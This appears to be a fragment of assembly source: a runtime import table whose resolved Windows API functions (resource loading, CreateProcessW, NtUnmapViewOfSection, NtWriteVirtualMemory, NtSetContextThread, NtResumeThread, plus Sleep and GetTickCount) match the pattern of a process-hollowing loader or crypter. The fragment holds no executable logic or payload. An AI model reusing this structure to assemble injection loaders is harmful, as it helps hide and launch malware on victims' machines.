FunctionEntries:

 dd FunctionNames.szFindResourceW
 dd FunctionAddresses.pFindResourceW

 dd FunctionNames.szLoadResource
 dd FunctionAddresses.pLoadResource

 dd FunctionNames.szSizeofResource
 dd FunctionAddresses.pSizeofResource

 dd FunctionNames.szLockResource
 dd FunctionAddresses.pLockResource

 dd FunctionNames.szCreateProcessW
 dd FunctionAddresses.pCreateProcessW

 dd FunctionNames.szNtGetContextThread
 dd FunctionAddresses.pNtGetContextThread

 dd FunctionNames.szNtUnmapViewOfSection
 dd FunctionAddresses.pNtUnmapViewOfSection

 dd FunctionNames.szNtAllocateVirtualMemory
 dd FunctionAddresses.pNtAllocateVirtualMemory

 dd FunctionNames.szNtWriteVirtualMemory
 dd FunctionAddresses.pNtWriteVirtualMemory

 dd FunctionNames.szNtSetContextThread
 dd FunctionAddresses.pNtSetContextThread

 dd FunctionNames.szNtResumeThread
 dd FunctionAddresses.pNtResumeThread

 dd FunctionNames.szNtTerminateProcess
 dd FunctionAddresses.pNtTerminateProcess

 dd FunctionNames.szSleep
 dd FunctionAddresses.pSleep

 dd FunctionNames.szGetTickCount
 dd FunctionAddresses.pGetTickCount

 dd FunctionNames.szExitProcess
 dd FunctionAddresses.pExitProcess

 dd FunctionNames.szLoadLibraryA
 dd FunctionAddresses.pLoadLibraryA

 dd FunctionNames.szGetProcAddress
 dd FunctionAddresses.pGetProcAddress

 dd FunctionNames.szVirtualAlloc	
 dd FunctionAddresses.pVirtualAlloc

 dd FunctionNames.sziswalpha
 dd FunctionAddresses.piswalpha

.Count EQU ($-FunctionEntries) / 8

FunctionNames:
 .szFindResourceW: db "FindResourceW",0
 .szLoadResource: db "LoadResource",0
 .szSizeofResource: db "SizeofResource",0
 .szLockResource: db "LockResource",0
 .szCreateProcessW: db "CreateProcessW",0
 .szNtGetContextThread: db "NtGetContextThread",0
 .szNtUnmapViewOfSection: db "NtUnmapViewOfSection",0
 .szNtAllocateVirtualMemory: db "NtAllocateVirtualMemory",0
 .szNtWriteVirtualMemory: db "NtWriteVirtualMemory",0
 .szNtSetContextThread: db "NtSetContextThread",0
 .szNtResumeThread: db "NtResumeThread",0
 .szNtTerminateProcess: db "NtTerminateProcess",0
 .szSleep: db "Sleep",0
 .szGetTickCount: db "GetTickCount",0
 .szExitProcess: db "ExitProcess",0
 .szLoadLibraryA: db "LoadLibraryA",0
 .szGetProcAddress: db "GetProcAddress",0
 .szVirtualAlloc: db "VirtualAlloc",0
 .sziswalpha: db "iswalpha",0

FunctionAddresses:
 .pFindResourceW: dd 0
 .pLoadResource: dd 0
 .pSizeofResource: dd 0
 .pLockResource: dd 0
 .pCreateProcessW: dd 0
 .pNtGetContextThread: dd 0
 .pNtUnmapViewOfSection: dd 0
 .pNtAllocateVirtualMemory: dd 0
 .pNtWriteVirtualMemory: dd 0
 .pNtSetContextThread: dd 0
 .pNtResumeThread: dd 0
 .pNtTerminateProcess: dd 0
 .pSleep: dd 0
 .pGetTickCount: dd 0
 .pExitProcess: dd 0
 .pLoadLibraryA: dd 0
 .pGetProcAddress: dd 0
 .pVirtualAlloc: dd 0
 .piswalpha: dd 0